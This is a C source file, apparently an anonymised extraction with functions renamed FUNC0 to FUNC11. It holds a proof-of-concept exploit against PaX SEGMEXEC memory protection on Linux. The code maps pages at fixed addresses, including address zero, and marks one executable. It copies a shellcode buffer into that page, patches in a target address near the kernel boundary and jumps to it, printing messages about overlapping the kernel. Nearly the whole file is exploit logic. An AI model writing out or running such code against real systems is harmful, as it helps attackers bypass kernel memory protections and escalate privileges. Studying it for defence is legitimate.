#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 scalar_t__ MAP1_BASE ; 
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_GROWSDOWN ; 
 int MAP_PRIVATE ; 
 int PAGE_SIZE ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int SEGMEXEC_TASK_SIZE ; 
 int /*<<< orphan*/  SIGBUS ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*) ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (void*,scalar_t__,int) ; 
 void* FUNC4 (void*,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  mouarf ; 
 scalar_t__ FUNC5 (void*,int,int) ; 
 scalar_t__ FUNC6 (int,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,int,...) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ ucode ; 

int FUNC11( void )
{
int i = 1;
void (* p)();

FUNC9 (SIGBUS, mouarf);

if( FUNC4( (void *) MAP1_BASE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
FUNC7( "mmap map1 base\n" );
return( 1 );
}

if( FUNC4( (void *) 0x0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
FUNC7( "mmap 0x0 failed\n" );
return( 1 );
}

if( FUNC5( (void *) MAP1_BASE, PAGE_SIZE,
PROT_READ | PROT_WRITE | PROT_EXEC ) < 0 )
{
FUNC7( "mprotect map1 base" );
FUNC1( stderr, "run chpax -m on this executable\n" );
return( 1 );
}

* (int *) (ucode + 1) = (SEGMEXEC_TASK_SIZE - (PAGE_SIZE * i));
FUNC3 ((void *)(MAP1_BASE + 600), ucode, 20);
p = (void *) MAP1_BASE + 600;
FUNC8 ("--> about to fault on %X\n", SEGMEXEC_TASK_SIZE - (PAGE_SIZE * i));
p ();
FUNC8 ("Overlaping the kernel by %d pages\n", i);

FUNC0( stdout );

FUNC8 ("Calling munmap ... %X, %x\n", 0x2000, 0x1000);
if (FUNC6 (0x2000, 0x1000) < 0 )
FUNC7 ("munmap");

// printf ("Calling mremap ... \n");
// if (mremap (0x2000, 0x1000, 0x10000, MREMAP_MAYMOVE) < 0 )
// perror ("mremap");

FUNC8 ("PID:%d, sleeping\n", FUNC2 ());
FUNC10 (2000);
return( 0 );
}